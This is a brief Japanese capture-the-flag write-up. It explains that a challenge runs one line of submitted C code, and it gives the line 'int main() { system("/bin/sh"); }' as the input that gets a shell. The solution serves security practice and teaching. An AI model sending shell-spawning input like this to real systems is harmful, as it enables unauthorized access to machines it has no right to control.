渡されたコードを見ると、Cのコードを1行だけ実行することができるらしいとわかる。
そこで、system関数を呼びシェルを取ることを考える。
実は、C言語にはincludeしなくても標準的な関数を呼び足すことができるため、以下を送信すればシェルがとれる。

int main() { system("/bin/sh"); }

